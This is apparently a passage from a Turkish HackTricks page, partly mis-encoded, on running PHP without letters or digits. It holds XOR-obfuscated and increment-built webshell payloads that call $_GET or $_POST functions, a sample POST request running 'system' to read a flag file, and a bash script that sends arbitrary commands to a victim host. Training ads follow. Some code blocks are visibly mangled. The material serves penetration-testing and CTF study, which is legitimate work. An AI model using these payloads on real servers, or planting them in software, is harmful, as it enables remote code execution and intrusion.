$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Yani, eÄŸer **rakamlar ve harfler olmadan rastgele PHP Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z**, aÅŸaÄŸÄ±daki gibi bir istek gÃ¶nderebilirsiniz, bu yÃ¼kÃ¼ kullanarak rastgele PHP Ã§alÄ±ÅŸtÄ±rmak iÃ§in:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha derin bir aÃ§Ä±klama iÃ§in [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match) adresini kontrol edin.

### XOR Shellcode (eval iÃ§inde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl benzeri
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
